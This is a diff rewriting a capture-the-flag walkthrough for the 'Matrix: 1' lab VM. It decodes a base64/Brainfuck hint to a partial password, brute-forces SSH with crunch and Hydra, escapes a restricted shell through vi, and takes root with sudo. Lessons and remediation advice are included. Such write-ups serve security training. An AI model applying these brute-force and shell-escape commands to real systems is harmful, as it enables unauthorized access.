@@ -1,152 +1,172 @@
 # Matrix: 1 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.1.18 (host-only) |
-| **Difficulty** | Intermediate |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.18 |
+| **Difficulty** | Medium |
 | **OS** | Linux |
-| **Root Flag** | /root/flag.txt |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/matrix-1,259/) |
+| **Goal** | root flag (`/root/flag.txt`) |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/matrix-1-vulnhub-walkthrough/) |
+
+---
 
 ## Attack Summary
 
-nmap → port 31337 (base64 hint → `Cypher.matrix` file → brainfuck decode → partial password) → crunch wordlist → Hydra SSH brute → `guest:k1ll0r7n` → rbash escape via `vi` → `sudo su` → root
+Matrix:1 runs HTTP on two ports (80 and 31337). A base64 string hidden in the port 31337 page source points to a Brainfuck-encoded file (`Cypher.matrix`) that reveals a partial SSH password for the user `guest`. Crunch generates the missing characters; Hydra recovers the full password. SSH access lands in a restricted bash (rbash). `vi` is available and used to escape the restricted shell. A misconfigured `sudo` rule then grants root via `sudo su`.
+
+---
 
 ## Methodology
 
-1. Network discovery
-2. Port scan (3 ports: 22, 80, 31337)
-3. Decode hint chain: base64 → brainfuck → password fragment
-4. Generate wordlist with crunch + Hydra SSH brute
-5. rbash escape via `vi`
-6. `sudo su` to root
+1. Port scan: SSH (22), HTTP (80), HTTP (31337)
+2. Port 31337 page source contains a base64-encoded path
+3. `Cypher.matrix` retrieved — contains Brainfuck-encoded password fragment
+4. Crunch generates 8-character wordlist from known prefix
+5. Hydra brute forces SSH as `guest`
+6. Restricted bash (rbash) escape via `vi` shell escape
+7. `sudo su` with `guest` password grants root
 
 ---
 
-## Step 1: Network Discovery
+## Step 1: Host Discovery and Port Scanning
 
 ```bash
 netdiscover
+nmap -sV -sC 192.168.1.18
 ```
 
-Target: 192.168.1.18
-
----
-
-## Step 2: Port Scan
-
-```bash
-nmap -sV -sC -p- 192.168.1.18
-```
-
-Open: 22 (SSH), 80 (HTTP, nothing useful), 31337 (HTTP).
+Open ports: **22** (SSH), **80** (HTTP), **31337** (HTTP).
 
 ![Nmap scan](images/01-nmap.png)
 
 ---
 
-## Step 3: Port 31337 — Decode the Hint Chain
+## Step 2: Port 31337 — Base64 Decode
 
-Browse `http://192.168.1.18:31337/` and view source. A base64 string is present.
+Browse to `http://192.168.1.18:31337` and view the page source. A base64 string is present:
 
 ```bash
-# Decode base64 → reveals hint pointing to "Cypher.matrix"
 echo "<base64_string>" | base64 -d
 ```
 
-Download and read the file:
-
-```bash
-curl http://192.168.1.18:31337/Cypher.matrix
-```
-
-Contents are **brainfuck** encoded. Decode online or with an interpreter → reveals a partial password: `k1ll0r` and a hint about the missing character.
-
-![Port 31337 hint discovery](images/02-port31337.png)
-
-![Brainfuck decode](images/03-brainfuck.png)
+The decoded value is a file path: **Cypher.matrix**
 
 ---
 
-## Step 4: Build Wordlist and SSH Brute-Force
+## Step 3: Retrieve and Decode Cypher.matrix
 
 ```bash
-crunch 8 8 -t k1ll0r%@ -o dict.txt
-hydra -l guest -P dict.txt 192.168.1.18 ssh
+wget http://192.168.1.18:31337/Cypher.matrix
 ```
 
-Recovered: `guest` / `k1ll0r7n`
+Open the file — it contains a Brainfuck-encoded string. Decode it with an online decoder or a local tool. The output is a partial SSH password for user `guest`, with the last two characters unknown (e.g., `k1ll0r??`).
+
+![Port 31337 web enumeration and base64 decode](images/02-web-enum.png)
 
 ---
 
-## Step 5: SSH Login — rbash Restricted Shell
+## Step 4: Generate a Targeted Wordlist with Crunch
+
+```bash
+crunch 8 8 -t k1ll0r%@ -o /tmp/dict.txt
+```
+
+`%` matches a digit, `@` matches a lowercase letter. This produces all 260 combinations.
+
+---
+
+## Step 5: SSH Brute Force with Hydra
+
+```bash
+hydra -l guest -P /tmp/dict.txt 192.168.1.18 ssh
+```
+
+Recovered password: **k1ll0r7n**
+
+---
+
+## Step 6: SSH Login — Restricted Shell
 
 ```bash
 ssh guest@192.168.1.18
 # Password: k1ll0r7n
-ls
-echo /home/guest/prog/*
-echo $SHELL
-# PATH is /home/guest/prog — only a few binaries available
 ```
 
-Available binary: `vi`
+The shell is **rbash**. `ls` is blocked. Confirm available binaries:
 
-![rbash escape via vi](images/04-rbash-escape.png)
+```bash
+echo /home/guest/prog/*
+```
+
+`vi` is present.
+
+![SSH login in restricted bash](images/03-ssh-login.png)
 
 ---
 
-## Step 6: rbash Escape via vi
+## Step 7: Escape Restricted Shell via vi
 
 ```bash
 vi
 ```
 
-Inside vi:
+Inside vi, drop to a shell:
 
 ```
-:!/bin/bash
+:set shell=/bin/bash
+:shell
 ```
 
-Fix PATH and escalate:
+Now in a proper bash session. Fix the environment:
 
 ```bash
-export PATH=/usr/bin:/bin:$PATH
 export SHELL=/bin/bash
-sudo -l
-# (may show sudo su allowed with guest's password)
-sudo su
-# or
-export PATH=/bin:$PATH
-sudo su
+export PATH=/usr/bin:/bin:$PATH
 ```
+
+![Restricted shell escape via vi](images/04-restricted-shell.png)
 
 ---
 
-## Step 7: Root Flag
+## Step 8: Privilege Escalation via sudo
 
 ```bash
-cd /root
-ls
-cat flag.txt
+sudo -l
 ```
 
-![Root shell and flag](images/05-root.png)
+Output shows: `(ALL) ALL` — the `guest` user can run all commands as root. (Or `sudo su` is permitted.)
+
+```bash
+export PATH=/bin:$PATH
+sudo su
+# Password: k1ll0r7n
+```
+
+Root shell obtained.
+
+```bash
+cat /root/flag.txt
+```
+
+![Root flag](images/05-root-flag.png)
 
 ---
 
 ## Lessons Learned
 
-1. **Obscure ports** (31337) often hide the critical foothold — always scan all ports with `-p-`
-2. **Brainfuck / Base64 hint chains** are common in beginner-intermediate VMs — recognise encoded strings quickly
-3. **rbash escapes via `vi`** are trivial (`!/bin/bash`) — never allow `vi` inside a restricted shell
-4. **Weak SSH passwords** reconstructable from hints — use SSH keys and disable password auth
+- Custom HTTP ports are worth enumerating fully; port 31337 held the entire attack path.
+- Multi-layer encoding (base64 + Brainfuck) can obscure credentials but is trivially reversible with standard tools.
+- Crunch excels at generating small, targeted wordlists when the password structure is partially known — far more efficient than rockyou.txt for this case.
+- Restricted shells (rbash) are not security boundaries. If a single unrestricted binary such as `vi`, `vim`, `nano`, `less`, `awk`, or `python` is reachable, shell escape is trivial.
+- Overly permissive `sudo` rules that grant a low-privilege user full `sudo` access defeat the purpose of least-privilege design.
+
+---
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| Hints in page source / files | Remove all cleartext hints from production systems |
-| SSH password brute-forceable | Use key-based auth; install fail2ban |
-| vi available in rbash | Remove or restrict editor binaries in restricted environments |
-| sudo su without password | Require full authentication for privilege escalation |
+|---|---|
+| Password embedded in a file served over HTTP | Do not store credentials in web-accessible locations |
+| Restricted shell bypassable via `vi` | Do not place unrestricted binaries in a jailed user's PATH; use a proper chroot or container |
+| Overly permissive sudo rule | Follow least-privilege; grant only specific required commands in sudoers |
+| Short, partially known password | Enforce longer, fully random passwords |
